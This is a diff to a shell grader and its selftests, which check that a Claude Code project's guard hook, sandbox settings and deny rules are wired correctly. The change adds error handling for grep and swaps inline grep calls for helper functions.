@@ -944,15 +944,23 @@ check_dir() {
       if [ -z "$matcher" ]; then
         echo "FAIL: could not resolve the matcher of the PreToolUse hook that runs guard.sh"; fail=1
       else
-        missing=''
+        missing=''; _gw_gerr=0
         # Anchored full-match (^(...)$) mirrors Claude's tool-name matching, so a degenerate
         # matcher like '.' can't false-pass and '.*' (admits all) correctly passes.
         for t in $MUTATING_TOOLS; do
-          printf '%s\n' "$t" | grep -Eq "^($matcher)$" 2>/dev/null || missing="$missing $t"
+          if _gw_ge=$(printf '%s\n' "$t" | grep -Eq "^($matcher)$" 2>&1); then   # GWM-GR
+            :
+          else
+            _gw_gr=$?
+            case $_gw_gr in
+              1) missing="$missing $t" ;;
+              *) echo "FAIL: guard-wired grader error — grep exited rc=$_gw_gr while matching tool '$t' against the matcher '$matcher' (stderr: ${_gw_ge:-none}); this is an error, not 'does not admit'"; fail=1; _gw_gerr=1 ;;   # GWM-GE
+            esac
+          fi
         done
         if [ -n "$missing" ]; then
           echo "FAIL: guard matcher '$matcher' does not admit mutating tool(s):$missing — the guard would be DARK for them"; fail=1
-        else
+        elif [ "$_gw_gerr" = 0 ]; then
           echo "PASS: guard matcher '$matcher' admits the mutating tools (Bash/Write/Edit/NotebookEdit/mcp__*)"
         fi
       fi
@@ -1206,6 +1214,8 @@ check_dir() {
 selftest() {
   st=0
   base=$(mktemp -d)
+  _unv_f=$base/unverified   # SWAS-577: the marker file of grep calls that could not answer (read by _unv_end before the verdict)
+  : > "$_unv_f" || { echo "selftest FAIL: the UNVERIFIED marker file cannot be created ($_unv_f), so an unanswered grep could not be recorded"; st=1; }
 
   # The strict profile's `sandbox` block as a fixture (the template's shape, in its STRICT form: no
   # network.allowUnixSockets, which the leg must accept since allowUnixSockets is optional).
@@ -1245,34 +1255,34 @@ selftest() {
   if command -v jq >/dev/null 2>&1; then
     d="$base/sbx_off"; mk_sbx "$d" '.sandbox.enabled = false'
     if out=$(check_dir "$d" 2>&1); then rc=0; else rc=$?; fi
-    if [ "$rc" -eq 0 ] && printf '%s' "$out" | grep -q 'sandbox is off'; then echo "selftest PASS: sandbox.enabled=false -> wired (the shipped default)"; else echo "selftest FAIL: sandbox.enabled=false should be wired as the off default (rc=$rc)"; st=1; fi
+    if [ "$rc" -eq 0 ] && _has "$out" 'sandbox is off'; then echo "selftest PASS: sandbox.enabled=false -> wired (the shipped default)"; else echo "selftest FAIL: sandbox.enabled=false should be wired as the off default (rc=$rc)"; st=1; fi
     d="$base/sbx_nosandbox"; mk_sbx "$d" 'del(.sandbox)'
     if out=$(check_dir "$d" 2>&1); then rc=0; else rc=$?; fi
-    if [ "$rc" -eq 0 ] && printf '%s' "$out" | grep -q 'sandbox is off'; then echo "selftest PASS: no sandbox block -> wired (off)"; else echo "selftest FAIL: no sandbox block should be wired as off (rc=$rc)"; st=1; fi
+    if [ "$rc" -eq 0 ] && _has "$out" 'sandbox is off'; then echo "selftest PASS: no sandbox block -> wired (off)"; else echo "selftest FAIL: no sandbox block should be wired as off (rc=$rc)"; st=1; fi
     # The Edit denies and the hook stay required in the OFF default (the layer left when the OS sandbox is off).
     for _r in 'Edit(/.claude/**)' 'Edit(/hooks/**)' 'Edit(/.kit/**)'; do
       d="$base/off_no_$(printf '%s' "$_r" | tr -c 'A-Za-z0-9\n' '_')"; mk "$d" 'Bash|Write|Edit|NotebookEdit|mcp__.*'
       jq --arg r "$_r" 'del(.permissions.deny[] | select(. == $r))' "$d/.claude/settings.json" > "$d/s.new" && mv "$d/s.new" "$d/.claude/settings.json"
       if out=$(check_dir "$d" 2>&1); then rc=0; else rc=$?; fi
-      if [ "$rc" -eq 1 ] && printf '%s' "$out" | grep -qF "permissions.deny lacks $_r"; then echo "selftest PASS: off default without $_r -> FAIL"; else echo "selftest FAIL: off default without $_r should FAIL (rc=$rc)"; st=1; fi
+      if [ "$rc" -eq 1 ] && _has "$out" "permissions.deny lacks $_r"; then echo "selftest PASS: off default without $_r -> FAIL"; else echo "selftest FAIL: off default without $_r should FAIL (rc=$rc)"; st=1; fi
     done
     # An adopter's settings.local.json turning the sandbox on: the EFFECTIVE block is checked (scalars local over
     # project, filesystem arrays concatenated).
     d="$base/loc_full"; mk "$d" 'Bash|Write|Edit|NotebookEdit|mcp__.*'; mk_loc "$d" '.'
     if out=$(check_dir "$d" 2>&1); then rc=0; else rc=$?; fi
-    if [ "$rc" -eq 0 ] && printf '%s' "$out" | grep -q 'PASS: the effective sandbox block'; then echo "selftest PASS: an adopter local file holding the full strict block -> wired"; else echo "selftest FAIL: an adopter local file holding the full strict block should be wired (rc=$rc)"; st=1; fi
+    if [ "$rc" -eq 0 ] && _has "$out" 'PASS: the effective sandbox block'; then echo "selftest PASS: an adopter local file holding the full strict block -> wired"; else echo "selftest FAIL: an adopter local file holding the full strict block should be wired (rc=$rc)"; st=1; fi
     d="$base/loc_short"; mk "$d" 'Bash|Write|Edit|NotebookEdit|mcp__.*'; mk_loc "$d" 'del(.sandbox.filesystem.denyWrite[] | select(. == "./.claude"))'
     if out=$(check_dir "$d" 2>&1); then rc=0; else rc=$?; fi
-    if [ "$rc" -eq 1 ] && printf '%s' "$out" | grep -qF 'denyWrite lacks ./.claude'; then echo "selftest PASS: an adopter local file with a short denyWrite -> FAIL"; else echo "selftest FAIL: an adopter local file with a short denyWrite should FAIL (rc=$rc)"; st=1; fi
+    if [ "$rc" -eq 1 ] && _has "$out" 'denyWrite lacks ./.claude'; then echo "selftest PASS: an adopter local file with a short denyWrite -> FAIL"; else echo "selftest FAIL: an adopter local file with a short denyWrite should FAIL (rc=$rc)"; st=1; fi
     d="$base/loc_enabled_only"; mk "$d" 'Bash|Write|Edit|NotebookEdit|mcp__.*'; printf '{"sandbox":{"enabled":true}}\n' > "$d/.claude/settings.local.json"
     if out=$(check_dir "$d" 2>&1); then rc=0; else rc=$?; fi
-    if [ "$rc" -eq 1 ] && printf '%s' "$out" | grep -qF 'denyWrite lacks'; then echo "selftest PASS: an adopter local file that only sets enabled -> FAIL"; else echo "selftest FAIL: an adopter local file that only sets enabled should FAIL (rc=$rc)"; st=1; fi
+    if [ "$rc" -eq 1 ] && _has "$out" 'denyWrite lacks'; then echo "selftest PASS: an adopter local file that only sets enabled -> FAIL"; else echo "selftest FAIL: an adopter local file that only sets enabled should FAIL (rc=$rc)"; st=1; fi
     d="$base/loc_unsandboxed"; mk "$d" 'Bash|Write|Edit|NotebookEdit|mcp__.*'; mk_loc "$d" '.sandbox.allowUnsandboxedCommands = true'
     if out=$(check_dir "$d" 2>&1); then rc=0; else rc=$?; fi
-    if [ "$rc" -eq 1 ] && printf '%s' "$out" | grep -qF 'allowUnsandboxedCommands'; then echo "selftest PASS: an adopter local file with allowUnsandboxedCommands true -> FAIL"; else echo "selftest FAIL: an adopter local file with allowUnsandboxedCommands true should FAIL (rc=$rc)"; st=1; fi
+    if [ "$rc" -eq 1 ] && _has "$out" 'allowUnsandboxedCommands'; then echo "selftest PASS: an adopter local file with allowUnsandboxedCommands true -> FAIL"; else echo "selftest FAIL: an adopter local file with allowUnsandboxedCommands true should FAIL (rc=$rc)"; st=1; fi
     d="$base/loc_badjson"; mk "$d" 'Bash|Write|Edit|NotebookEdit|mcp__.*'; printf '{ not json\n' > "$d/.claude/settings.local.json"
     if out=$(check_dir "$d" 2>&1); then rc=0; else rc=$?; fi
-    if [ "$rc" -eq 1 ] && printf '%s' "$out" | grep -qF 'not valid JSON'; then echo "selftest PASS: an adopter local file that is not JSON -> FAIL"; else echo "selftest FAIL: an adopter local file that is not JSON should FAIL (rc=$rc)"; st=1; fi
+    if [ "$rc" -eq 1 ] && _has "$out" 'not valid JSON'; then echo "selftest PASS: an adopter local file that is not JSON -> FAIL"; else echo "selftest FAIL: an adopter local file that is not JSON should FAIL (rc=$rc)"; st=1; fi
     # The documented merge: arrays CONCATENATE across the two files (half the entries in each is the full set), and
     # a local enabled:false turns a strict project file off (scalars: local over project).
     d="$base/loc_split"; mk_sbx "$d" '.sandbox.filesystem.denyWrite = .sandbox.filesystem.denyWrite[0:5]'; mk_loc "$d" '.sandbox.filesystem.denyWrite = .sandbox.filesystem.denyWrite[5:]'
@@ -1280,14 +1290,14 @@ selftest() {
     if [ "$rc" -eq 0 ]; then echo "selftest PASS: denyWrite split across settings.json and the local file -> wired (arrays concatenate)"; else echo "selftest FAIL: a denyWrite split across the two files should be wired (rc=$rc)"; st=1; fi
     d="$base/loc_turns_off"; mk_sbx "$d" '.'; printf '{"sandbox":{"enabled":false}}\n' > "$d/.claude/settings.local.json"
     if out=$(check_dir "$d" 2>&1); then rc=0; else rc=$?; fi
-    if [ "$rc" -eq 0 ] && printf '%s' "$out" | grep -q 'sandbox is off'; then echo "selftest PASS: a local enabled:false over a strict project file -> off, wired"; else echo "selftest FAIL: a local enabled:false should override the project (rc=$rc)"; st=1; fi
+    if [ "$rc" -eq 0 ] && _has "$out" 'sandbox is off'; then echo "selftest PASS: a local enabled:false over a strict project file -> off, wired"; else echo "selftest FAIL: a local enabled:false should override the project (rc=$rc)"; st=1; fi
     # The shipped strict template: exists and parses and carries every load-bearing key in the kit's own tree.
     d="$base/tmpl_good"; mkdir -p "$d"; mk_tmpl "$d" '.'
     if _gw_template_check "$d" >/dev/null 2>&1; then echo "selftest PASS: a complete strict template -> wired"; else echo "selftest FAIL: a complete strict template should be wired"; st=1; fi
     _tm_mut() {  # <dir-name> <jq-filter> <expected-substring>
       d="$base/tmpl_$1"; mkdir -p "$d"; mk_tmpl "$d" "$2"
       if out=$(_gw_template_check "$d" 2>&1); then rc=0; else rc=$?; fi
-      if [ "$rc" -eq 1 ] && printf '%s' "$out" | grep -qF "$3"; then echo "selftest PASS: strict template $1 -> FAIL"; else echo "selftest FAIL: strict template $1 should FAIL naming '$3' (rc=$rc)"; st=1; fi
+      if [ "$rc" -eq 1 ] && _has "$out" "$3"; then echo "selftest PASS: strict template $1 -> FAIL"; else echo "selftest FAIL: strict template $1 should FAIL naming '$3' (rc=$rc)"; st=1; fi
     }
     _tm_mut enabled_false '.sandbox.enabled = false' 'sandbox.enabled'
     _tm_mut unsandboxed_true '.sandbox.allowUnsandboxedCommands = true' 'allowUnsandboxedCommands'
@@ -1302,24 +1312,24 @@ selftest() {
     done
     d="$base/tmpl_badjson"; mkdir -p "$d/templates"; printf '{ not json\n' > "$d/templates/sandbox-strict.settings.local.json"
     if out=$(_gw_template_check "$d" 2>&1); then rc=0; else rc=$?; fi
-    if [ "$rc" -eq 1 ] && printf '%s' "$out" | grep -qF 'not valid JSON'; then echo "selftest PASS: a strict template that is not JSON -> FAIL"; else echo "selftest FAIL: a non-JSON strict template should FAIL (rc=$rc)"; st=1; fi
+    if [ "$rc" -eq 1 ] && _has "$out" 'not valid JSON'; then echo "selftest PASS: a strict template that is not JSON -> FAIL"; else echo "selftest FAIL: a non-JSON strict template should FAIL (rc=$rc)"; st=1; fi
     d="$base/tmpl_nomarker"; mkdir -p "$d"
     if out=$(_gw_template_check "$d" 2>&1); then rc=0; else rc=$?; fi
-    if [ "$rc" -eq 0 ] && printf '%s' "$out" | grep -q '^N/A'; then echo "selftest PASS: no template and no kit marker -> N/A"; else echo "selftest FAIL: no template and no kit marker should be N/A (rc=$rc)"; st=1; fi
+    if [ "$rc" -eq 0 ] && _has_line "$out" 'N/A'; then echo "selftest PASS: no template and no kit marker -> N/A"; else echo "selftest FAIL: no template and no kit marker should be N/A (rc=$rc)"; st=1; fi
     d="$base/tmpl_marker"; mkdir -p "$d/docs"; : > "$d/docs/ROADMAP-KIT.md"
     if out=$(_gw_template_check "$d" 2>&1); then rc=0; else rc=$?; fi
-    if [ "$rc" -eq 1 ] && printf '%s' "$out" | grep -qF 'missing from a kit tree'; then echo "selftest PASS: a kit-source tree without the strict template -> FAIL"; else echo "selftest FAIL: a kit-source tree without the strict template should FAIL (rc=$rc)"; st=1; fi
+    if [ "$rc" -eq 1 ] && _has "$out" 'missing from a kit tree'; then echo "selftest PASS: a kit-source tree without the strict template -> FAIL"; else echo "selftest FAIL: a kit-source tree without the strict template should FAIL (rc=$rc)"; st=1; fi
     d="$base/sbx_unsandboxed"; mk_sbx "$d" '.sandbox.allowUnsandboxedCommands = true'
     if out=$(check_dir "$d" 2>&1); then rc=0; else rc=$?; fi
-    if [ "$rc" -eq 1 ] && printf '%s' "$out" | grep -q 'allowUnsandboxedCommands'; then echo "selftest PASS: allowUnsandboxedCommands=true -> FAIL"; else echo "selftest FAIL: allowUnsandboxedCommands=true should FAIL (rc=$rc)"; st=1; fi
+    if [ "$rc" -eq 1 ] && _has "$out" 'allowUnsandboxedCommands'; then echo "selftest PASS: allowUnsandboxedCommands=true -> FAIL"; else echo "selftest FAIL: allowUnsandboxedCommands=true should FAIL (rc=$rc)"; st=1; fi
     d="$base/sbx_nounsandboxedkey"; mk_sbx "$d" 'del(.sandbox.allowUnsandboxedCommands)'
     if out=$(check_dir "$d" 2>&1); then rc=0; else rc=$?; fi
-    if [ "$rc" -eq 1 ] && printf '%s' "$out" | grep -q 'allowUnsandboxedCommands'; then echo "selftest PASS: allowUnsandboxedCommands absent -> FAIL"; else echo "selftest FAIL: allowUnsandboxedCommands absent should FAIL (rc=$rc)"; st=1; fi
+    if [ "$rc" -eq 1 ] && _has "$out" 'allowUnsandboxedCommands'; then echo "selftest PASS: allowUnsandboxedCommands absent -> FAIL"; else echo "selftest FAIL: allowUnsandboxedCommands absent should FAIL (rc=$rc)"; st=1; fi
     # One mutant per added key/rule: each must FAIL naming the gap.
     _sbx_mut() {  # <dir-name> <jq-filter> <expected-substring>
       d="$base/$1"; mk_sbx "$d" "$2"
       if out=$(check_dir "$d" 2>&1); then rc=0; else rc=$?; fi
-      if [ "$rc" -eq 1 ] && printf '%s' "$out" | grep -qF "$3"; then echo "selftest PASS: $1 -> FAIL"; else echo "selftest FAIL: $1 should FAIL naming '$3' (rc=$rc)"; st=1; fi
+      if [ "$rc" -eq 1 ] && _has "$out" "$3"; then echo "selftest PASS: $1 -> FAIL"; else echo "selftest FAIL: $1 should FAIL naming '$3' (rc=$rc)"; st=1; fi
     }
     _sbx_mut sbx_autoallow_removed 'del(.sandbox.autoAllowBashIfSandboxed)' 'autoAllowBashIfSandboxed'
     _sbx_mut sbx_autoallow_true '.sandbox.autoAllowBashIfSandboxed = true' 'autoAllowBashIfSandboxed'
@@ -1338,7 +1348,7 @@ selftest() {
       d="$base/sbx_deny_$(printf '%s' "$_e" | tr -c 'A-Za-z0-9\n' '_')"
       mk_sbx "$d" "del(.sandbox.filesystem.denyWrite[] | select(. == \"$_e\"))"
       if out=$(check_dir "$d" 2>&1); then rc=0; else rc=$?; fi
-      if [ "$rc" -eq 1 ] && printf '%s' "$out" | grep -qF "denyWrite lacks $_e"; then echo "selftest PASS: denyWrite without $_e -> FAIL"; else echo "selftest FAIL: denyWrite without $_e should FAIL (rc=$rc)"; st=1; fi
+      if [ "$rc" -eq 1 ] && _has "$out" "denyWrite lacks $_e"; then echo "selftest PASS: denyWrite without $_e -> FAIL"; else echo "selftest FAIL: denyWrite without $_e should FAIL (rc=$rc)"; st=1; fi
     done
     d="$base/sbx_superset"; mk_sbx "$d" '.sandbox.filesystem.denyWrite += ["./extra"] | .sandbox.network.allowUnixSockets = ["/var/run/docker.sock"]'
     if check_dir "$d" >/dev/null 2>&1; then echo "selftest PASS: a superset denyWrite and an allowUnixSockets entry -> wired"; else echo "selftest FAIL: a superset denyWrite and allowUnixSockets should be wired"; st=1; fi
@@ -1348,19 +1358,19 @@ selftest() {
     d="$base/sbx_enf"; mk "$d" 'Bash|Write|Edit|NotebookEdit|mcp__.*'; mk_tmpl "$d" '.'
     mkdir -p "$base/sbx_bin"; ln -sf "$(command -v jq)" "$base/sbx_bin/jq"
     if out=$(PATH="$base/sbx_bin" /bin/sh "$0" --sandbox-enforce "$d" 2>&1); then rc=0; else rc=$?; fi
-    if [ "$rc" -eq 3 ] && printf '%s' "$out" | grep -q '^SKIP: npx'; then echo "selftest PASS: --sandbox-enforce without npx -> SKIP rc 3"; else echo "selftest FAIL: --sandbox-enforce without npx should SKIP with rc 3 (rc=$rc)"; st=1; fi
+    if [ "$rc" -eq 3 ] && _has_line "$out" 'SKIP: npx'; then echo "selftest PASS: --sandbox-enforce without npx -> SKIP rc 3"; else echo "selftest FAIL: --sandbox-enforce without npx should SKIP with rc 3 (rc=$rc)"; st=1; fi
     # _enf_fail <dir> <label>: the run must exit 1; rc 3 (no sandbox runtime here) is a disclosed SKIP, never a pass.
     _enf_fail() {
       if out=$(sh "$0" --sandbox-enforce "$1" 2>&1); then rc=0; else rc=$?; fi
       if [ "$rc" -eq 1 ]; then echo "selftest PASS: --sandbox-enforce $2 -> FAIL"
-      elif [ "$rc" -eq 3 ] && ! printf '%s' "$out" | grep -q '^FAIL'; then echo "selftest SKIP: --sandbox-enforce $2 (no sandbox runtime here)"
+      elif [ "$rc" -eq 3 ] && ! _has_line "$out" 'FAIL'; then echo "selftest SKIP: --sandbox-enforce $2 (no sandbox runtime here)"
       else echo "selftest FAIL: --sandbox-enforce $2 must exit 1 (rc=$rc)"; st=1; fi
     }
     # No template, or one that does not turn the sandbox on: there is no strict profile to enforce. Both exit 1
     # before the runtime is started, so these two never SKIP.
     d="$base/sbx_enf_notmpl"; mk "$d" 'Bash|Write|Edit|NotebookEdit|mcp__.*'
     if out=$(sh "$0" --sandbox-enforce "$d" 2>&1); then rc=0; else rc=$?; fi
-    if [ "$rc" -eq 1 ] && printf '%s' "$out" | grep -q 'strict'; then echo "selftest PASS: --sandbox-enforce with no strict template -> FAIL"; else echo "selftest FAIL: --sandbox-enforce with no strict template should FAIL (rc=$rc)"; st=1; fi
+    if [ "$rc" -eq 1 ] && _has "$out" 'strict'; then echo "selftest PASS: --sandbox-enforce with no strict template -> FAIL"; else echo "selftest FAIL: --sandbox-enforce with no strict template should FAIL (rc=$rc)"; st=1; fi
     d="$base/sbx_enf_off"; mk "$d" 'Bash|Write|Edit|NotebookEdit|mcp__.*'; mk_tmpl "$d" '.sandbox.enabled = false'
     if out=$(sh "$0" --sandbox-enforce "$d" 2>&1); then rc=0; else rc=$?; fi
     if [ "$rc" -eq 1 ]; then echo "selftest PASS: --sandbox-enforce on a strict profile that is off -> FAIL"; else echo "selftest FAIL: --sandbox-enforce with the strict profile off should FAIL (rc=$rc)"; st=1; fi
@@ -1399,7 +1409,7 @@ selftest() {
       [ "$#" -eq 3 ] || { echo "selftest FAIL: boundary helper _bd_mut called with $# arguments (3 expected; a glued or missing argument): ${1:-?}"; st=1; return 0; }
       _bd_n=$((_bd_n + 1)); d="$base/bd$_bd_n"; mk_bd "$d" "$2"
       if out=$(check_dir "$d" 2>&1 </dev/null); then rc=0; else rc=$?; fi
-      if [ "$rc" -eq 1 ] && printf '%s' "$out" | grep -qF -- "$3"; then echo "selftest PASS: boundary $1 -> FAIL"; else echo "selftest FAIL: boundary $1 should FAIL naming '$3' (rc=$rc)"; st=1; fi
+      if [ "$rc" -eq 1 ] && _has "$out" "$3"; then echo "selftest PASS: boundary $1 -> FAIL"; else echo "selftest FAIL: boundary $1 should FAIL naming '$3' (rc=$rc)"; st=1; fi
     }
     # ALL the cell helpers are defined here, before the first cell, so a call can never precede its definition (a helper used before it existed once
     # killed the whole selftest with rc 127). Each checks its argument count and prints a named FAIL; the presence loop below names a missing one.
@@ -1407,26 +1417,26 @@ selftest() {
       [ "$#" -eq 3 ] || { echo "selftest FAIL: boundary helper _bd_adv called with $# arguments (3 expected; a glued or missing argument): ${1:-?}"; st=1; return 0; }
       _bd_n=$((_bd_n + 1)); d="$base/bd$_bd_n"; mk_bd "$d" "$2"
       if out=$(check_dir "$d" 2>&1 </dev/null); then rc=0; else rc=$?; fi
-      if [ "$rc" -eq 0 ] && printf '%s' "$out" | grep -qF -- "$3"; then echo "selftest PASS: boundary $1 -> advice, wired"; else echo "selftest FAIL: boundary $1 should exit 0 printing '$3' (rc=$rc)"; st=1; fi
+      if [ "$rc" -eq 0 ] && _has "$out" "$3"; then echo "selftest PASS: boundary $1 -> advice, wired"; else echo "selftest FAIL: boundary $1 should exit 0 printing '$3' (rc=$rc)"; st=1; fi
     }
     _bd_cut() {  # <name> <jq-filter> <expected-substring>: the grader's jq program alone on the cut document (two forks, not a whole check_dir)
       [ "$#" -eq 3 ] || { echo "selftest FAIL: boundary helper _bd_cut called with $# arguments (3 expected; a glued or missing argument): ${1:-?}"; st=1; return 0; }
       _bd_n=$((_bd_n + 1)); _bd_last="cut $1"; _bd_good | jq "$2" > "$base/bdc$_bd_n.json"
       out=$(jq -r --argjson t "$GW_BD_TABLES" --arg home "${_bd_home:-${HOME:-}}" "$GW_BD_JQ" "$base/bdc$_bd_n.json" 2>&1 </dev/null) || out="<the grader program errored>"
-      if printf '%s' "$out" | grep -qF -- "$3"; then echo "selftest PASS: boundary $1 -> FAIL"; else echo "selftest FAIL: boundary $1 should FAIL naming '$3' (got: $out)"; st=1; fi
+      if _has "$out" "$3"; then echo "selftest PASS: boundary $1 -> FAIL"; else echo "selftest FAIL: boundary $1 should FAIL naming '$3' (got: $out)"; st=1; fi
     }
     _bd_loc() {  # <name> <local file text> <expected rc> <expected substring>
       [ "$#" -eq 4 ] || { echo "selftest FAIL: boundary helper _bd_loc called with $# arguments (4 expected; a glued or missing argument): ${1:-?}"; st=1; return 0; }
       _bd_n=$((_bd_n + 1)); d="$base/bd$_bd_n"; mk_bd "$d" '.'; printf '%s\n' "$2" > "$d/.claude/settings.local.json"
       if out=$(check_dir "$d" 2>&1 </dev/null); then rc=0; else rc=$?; fi
-      if [ "$rc" -eq "$3" ] && printf '%s' "$out" | grep -qF -- "$4"; then echo "selftest PASS: boundary local file $1"; else echo "selftest FAIL: boundary local file $1 should exit $3 naming '$4' (rc=$rc)"; st=1; fi
+      if [ "$rc" -eq "$3" ] && _has "$out" "$4"; then echo "selftest PASS: boundary local file $1"; else echo "selftest FAIL: boundary local file $1 should exit $3 naming '$4' (rc=$rc)"; st=1; fi
     }
     _bd_lax() {  # <name> <text opened before the first key; the document's first line is dropped>
       [ "$#" -eq 2 ] || { echo "selftest FAIL: boundary helper _bd_lax called with $# arguments (2 expected; a glued or missing argument): ${1:-?}"; st=1; return 0; }
       _bd_n=$((_bd_n + 1)); d="$base/bd$_bd_n"; mk_bd "$d" '.'
       { printf '%s' "$2"; tail -n +2 "$d/.claude/settings.json"; } > "$d/s.new" && mv "$d/s.new" "$d/.claude/settings.json"
       if out=$(check_dir "$d" 2>&1 </dev/null); then rc=0; else rc=$?; fi
-      if [ "$rc" -eq 1 ] && printf '%s' "$out" | grep -qF 'is not strict JSON'; then echo "selftest PASS: boundary parser differential $1 -> FAIL"; else echo "selftest FAIL: boundary parser differential $1 should FAIL as not strict JSON (rc=$rc)"; st=1; fi
+      if [ "$rc" -eq 1 ] && _has "$out" 'is not strict JSON'; then echo "selftest PASS: boundary parser differential $1 -> FAIL"; else echo "selftest FAIL: boundary parser differential $1 should FAIL as not strict JSON (rc=$rc)"; st=1; fi
       if ( _gw_bd_strict() { return 0; }; _gw_boundary_grade "$d/.claude/settings.json" "witness" >/dev/null 2>&1 ); then echo "selftest PASS: boundary parser differential $1 witness - with the strictness check neutered the document passes, so only that check catches it"; else echo "selftest FAIL: boundary parser differential $1 witness - the document fails for another reason too, the cell is not isolating the strictness check"; st=1; fi
     }
     _bd_nul() {  # <name> <lead|trail>
@@ -1435,7 +1445,7 @@ selftest() {
       if [ "$2" = lead ]; then { printf '\000'; cat "$d/.claude/settings.json"; } > "$d/s.new"; else { cat "$d/.claude/settings.json"; printf '\000'; } > "$d/s.new"; fi
       mv "$d/s.new" "$d/.claude/settings.json"
       if out=$(check_dir "$d" 2>&1 </dev/null); then rc=0; else rc=$?; fi
-      if [ "$rc" -eq 1 ] && printf '%s' "$out" | grep -qE 'is not (strict|valid) JSON'; then echo "selftest PASS: boundary a $2 NUL byte -> FAIL"; else echo "selftest FAIL: boundary a $2 NUL byte should FAIL as not strict / not valid JSON (rc=$rc)"; st=1; fi
+      if [ "$rc" -eq 1 ] && { _has "$out" 'is not strict JSON' || _has "$out" 'is not valid JSON'; }; then echo "selftest PASS: boundary a $2 NUL byte -> FAIL"; else echo "selftest FAIL: boundary a $2 NUL byte should FAIL as not strict / not valid JSON (rc=$rc)"; st=1; fi
       if [ "$2" = trail ]; then
         # The witness shows the strictness check is the ONLY catch, so it needs a jq that reads the document (macOS jq does; a Linux jq 1.7 refuses a
         # trailing NUL, and then the gate's own "not valid JSON" catches it first). Where jq refuses, the _bd_jqrefuse cells below are the replacement.
@@ -1448,28 +1458,28 @@ selftest() {
     done
     d="$base/bd_good"; mk_bd "$d" '.'
     if out=$(check_dir "$d" 2>&1); then rc=0; else rc=$?; fi
-    if [ "$rc" -eq 0 ] && printf '%s' "$out" | grep -qF 'PASS: boundary: the committed .claude/settings.json carries the full agent-boundary default'; then echo "selftest PASS: boundary the full document -> wired and graded"; else echo "selftest FAIL: boundary the full document should be wired and graded (rc=$rc)"; st=1; fi
+    if [ "$rc" -eq 0 ] && _has "$out" 'PASS: boundary: the committed .claude/settings.json carries the full agent-boundary default'; then echo "selftest PASS: boundary the full document -> wired and graded"; else echo "selftest FAIL: boundary the full document should be wired and graded (rc=$rc)"; st=1; fi
     # A jq that prints a partial result and then fails (what a Linux jq 1.7 does on a trailing NUL) must give ONE fail-closed line from the strict gate,
     # never a pass and never a second result. A PATH-stub jq makes this testable on every platform.
     d="$base/bd_jqrefuse"; mk_bd "$d" '.'; mkdir -p "$d/stub"
     { printf '#!/bin/sh\n'; printf 'echo "{\\"sandbox\\":"\nexit 2\n'; } > "$d/stub/jq"; chmod +x "$d/stub/jq"
     out=$( PATH="$d/stub:$PATH"; export PATH; _gw_bd_gate "$d/.claude/settings.json" "witness" 2>&1 ) && rc=0 || rc=$?
-    if [ "$rc" -eq 1 ] && [ "$(printf '%s\n' "$out" | grep -c .)" -eq 1 ] && printf '%s' "$out" | grep -qF 'is not valid JSON'; then echo "selftest PASS: boundary a jq that prints a partial result then fails -> one fail-closed line (not valid JSON)"; else echo "selftest FAIL: boundary a jq refusal should give exactly one 'not valid JSON' line and rc 1 (rc=$rc, got: $out)"; st=1; fi
+    if [ "$rc" -eq 1 ] && [ "$(_grepx "$out" -c .)" -eq 1 ] && _has "$out" 'is not valid JSON'; then echo "selftest PASS: boundary a jq that prints a partial result then fails -> one fail-closed line (not valid JSON)"; else echo "selftest FAIL: boundary a jq refusal should give exactly one 'not valid JSON' line and rc 1 (rc=$rc, got: $out)"; st=1; fi
     # The good document under CI=true with HOME at an empty directory (no ~/.claude) still grades and passes: nothing in the boundary leg may depend on either.
     d="$base/bd_ci_home"; mk_bd "$d" '.'; mkdir -p "$d/emptyhome"
     out=$( CI=true; export CI; HOME="$d/emptyhome"; export HOME; check_dir "$d" 2>&1 </dev/null ) && rc=0 || rc=$?
-    if [ "$rc" -eq 0 ] && printf '%s' "$out" | grep -qF 'PASS: boundary: the committed .claude/settings.json carries the full agent-boundary default'; then echo "selftest PASS: boundary the full document under CI=true with an empty HOME -> wired and graded"; else echo "selftest FAIL: boundary the full document should grade under CI=true with an empty HOME (rc=$rc)"; st=1; fi
+    if [ "$rc" -eq 0 ] && _has "$out" 'PASS: boundary: the committed .claude/settings.json carries the full agent-boundary default'; then echo "selftest PASS: boundary the full document under CI=true with an empty HOME -> wired and graded"; else echo "selftest FAIL: boundary the full document should grade under CI=true with an empty HOME (rc=$rc)"; st=1; fi
     d="$base/bd_none"; mk "$d" 'Bash|Write|Edit|NotebookEdit|mcp__.*'
     if out=$(check_dir "$d" 2>&1); then rc=0; else rc=$?; fi
-    if [ "$rc" -eq 0 ] && printf '%s' "$out" | grep -qF 'N/A: boundary default'; then echo "selftest PASS: boundary a tree with no claim yet (today's default) -> N/A, wired"; else echo "selftest FAIL: boundary a tree with no claim should be N/A and wired (rc=$rc)"; st=1; fi
+    if [ "$rc" -eq 0 ] && _has "$out" 'N/A: boundary default'; then echo "selftest PASS: boundary a tree with no claim yet (today's default) -> N/A, wired"; else echo "selftest FAIL: boundary a tree with no claim should be N/A and wired (rc=$rc)"; st=1; fi
     printf '{ not json\n' > "$base/bd_bad.json"
     if out=$(_gw_boundary_grade "$base/bd_bad.json" "the fixture" 2>&1); then rc=0; else rc=$?; fi
-    if [ "$rc" -eq 1 ] && printf '%s' "$out" | grep -qF 'is not valid JSON'; then echo "selftest PASS: boundary a document that is not JSON -> FAIL"; else echo "selftest FAIL: boundary a non-JSON document should FAIL (rc=$rc)"; st=1; fi
+    if [ "$rc" -eq 1 ] && _has "$out" 'is not valid JSON'; then echo "selftest PASS: boundary a document that is not JSON -> FAIL"; else echo "selftest FAIL: boundary a non-JSON document should FAIL (rc=$rc)"; st=1; fi
     d="$base/bd_dup"; mk_bd "$d" '.'
     awk '/^    "enabled": true,$/ {print "    \"enabled\": false,"} {print}' "$d/.claude/settings.json" > "$d/.claude/settings.json.new" && mv "$d/.claude/settings.json.new" "$d/.claude/settings.json"
     if ! grep -qF '"enabled": false,' "$d/.claude/settings.json"; then echo "selftest FAIL: boundary the duplicate-key fixture was not built"; st=1; fi
     if out=$(check_dir "$d" 2>&1); then rc=0; else rc=$?; fi
-    if [ "$rc" -eq 1 ] && printf '%s' "$out" | grep -qF 'duplicate JSON key' && ! printf '%s' "$out" | grep -qF 'sandbox.enabled is not'; then echo "selftest PASS: boundary a duplicate key whose last copy passes -> FAIL (raw text read)"; else echo "selftest FAIL: boundary a duplicate key whose last copy passes should FAIL on the raw text (rc=$rc)"; st=1; fi
